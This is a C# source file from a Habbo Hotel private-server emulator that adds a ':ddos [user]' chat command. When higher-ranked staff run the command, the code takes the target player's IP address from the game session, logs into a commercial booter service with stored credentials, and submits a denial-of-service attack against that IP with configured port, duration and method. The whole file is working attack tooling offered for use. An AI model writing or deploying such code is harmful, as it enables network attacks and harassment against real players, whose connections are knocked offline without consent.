using SkylightEmulator.Core;
using SkylightEmulator.HabboHotel.GameClients;
using SkylightEmulator.Utilies;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace SkylightEmulator.HabboHotel.Rooms.Commands
{
    class DDoSCommand : Command
    {
        public override string CommandInfo()
        {
            return ":ddos [user] - DDoS the user";
        }

        public override string RequiredPermission()
        {
            return "cmd_ddos";
        }

        public override bool ShouldBeLogged()
        {
            return true;
        }

        public override bool OnUse(GameClient session, string[] args)
        {
            if (args.Length >= 2)
            {
                if (session.GetHabbo().HasPermission("cmd_ddos"))
                {
                    GameClient target = Skylight.GetGame().GetGameClientManager().GetGameClientByUsername(args[1]);
                    if (target != null)
                    {
                        if (target.GetHabbo().Rank < session.GetHabbo().Rank)
                        {
                            if (Skylight.GetConfig()["booter.domain"] == "thunderstresser.com")
                            {
                                using (CookieAwareWebClient webClient = new CookieAwareWebClient())
                                {
                                    webClient.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                                    string loginResult = webClient.UploadString("https://thunderstresser.com/panel/login.php", "username=" + Skylight.GetConfig()["booter.username"] + "&password=" + Skylight.GetConfig()["booter.password"] + "&loginBtn=Login");

                                    webClient.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                                    string ddosResult = webClient.UploadString("https://thunderstresser.com/panel/hub.php", "host=" + target.GetIP() + "&port=" + Skylight.GetConfig()["booter.ddos-port"] + "&time=" + Skylight.GetConfig()["booter.ddos-time"] + "&method=" + Skylight.GetConfig()["booter.ddos-method"] + "&attackBtn=Send Attack");
                                }
                            }
                        }
                        else
                        {
                            session.SendNotif("You are not allowed to ddos that user.");
                        }
                    }
                    else
                    {
                        session.SendNotif("User not found.");
                    }
                }
            }

            return false;
        }
    }
}
